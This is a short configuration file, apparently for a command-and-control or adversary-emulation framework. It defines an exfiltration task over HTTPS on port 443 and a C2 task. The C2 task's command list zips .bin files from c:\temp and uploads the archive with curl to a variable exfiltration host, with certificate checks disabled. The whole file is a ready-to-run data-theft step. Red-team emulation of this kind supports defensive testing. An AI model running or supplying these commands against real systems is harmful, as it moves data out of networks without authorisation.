[exfil_task]
exfil_type = https
exfil_port = 443
exfil_outfile = exfil_file.zip
domain_name = None
cert_subj = /C=US/ST=Utah/L=Lehi/O=Your Company, Inc./OU=IT/CN=$HOST

[c2_task]
task_name = c2_http_MM_dd_YYYY_HH_mm
agent_name = 1w2x3y4z
command_list = zip c:\temp\$EXFIL_OUTFILE c:\temp\*.bin, curl -kF file=@c:\temp\$EXFIL_OUTFILE $EXFIL_TYPE://$EXFIL_HOST:$EXFIL_PORT/p
